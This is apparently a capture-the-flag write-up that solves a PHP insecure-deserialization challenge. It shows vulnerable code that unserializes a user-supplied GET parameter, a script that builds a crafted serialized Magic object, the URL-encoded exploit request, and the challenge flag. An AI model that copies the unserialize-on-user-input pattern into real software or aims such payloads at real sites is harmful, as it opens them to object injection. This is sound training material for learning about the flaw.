# It is magic after all

![](https://i.imgur.com/1eFastj.png)

- at first, we presented with this website

![](https://i.imgur.com/3MyAGvf.png)

- if we try to open source we are presented with this php code :

```php
 `<?php include "flag.php";    
  
class Magic {  
    public $key;  
  
    public function doMagic() {  
        if ($this->key === true) {  
          global $flag;  
          echo $flag;  
        }  
        else {  
            echo "Nothing...";  
        }  
    }  
}  
  
if (isset($_GET['magic'])) { $magic = unserialize($_GET['magic']); $magic->doMagic();  
} else {  
    print "Nothing...";  
} ?>`
```

- from what understood in the code that the parameter magic should have a serialized Magic class with a variable key set to true so it can output the flag so I wrote this simple PHP code :

```php
<?php

    
class Magic {
    public $key = true;

    public function doMagic() {
        if ($this->key === true) {
          global $flag;
          echo $flag;
        }
        else {
            echo "Nothing...";
        }
    }
} 
    $orig_object = new Magic();
    $serialize_bool_val = serialize($orig_object);
    echo $serialize_bool_val;
?>
```

- which outputs this `O:5:"Magic":1:{s:3:"key";b:1;}` if we url encode it and put it in a magic parameter the url will look like this `http://challenges.defsoc.tk:3000/?magic=O%3A5%3A%22Magic%22%3A1%3A%7Bs%3A3%3A%22key%22%3Bb%3A1%3B%7D`

![](https://i.imgur.com/P8hdDHW.png)

- Flag: flag{php_d3s3r14l1z4t10n_3xpl01ts}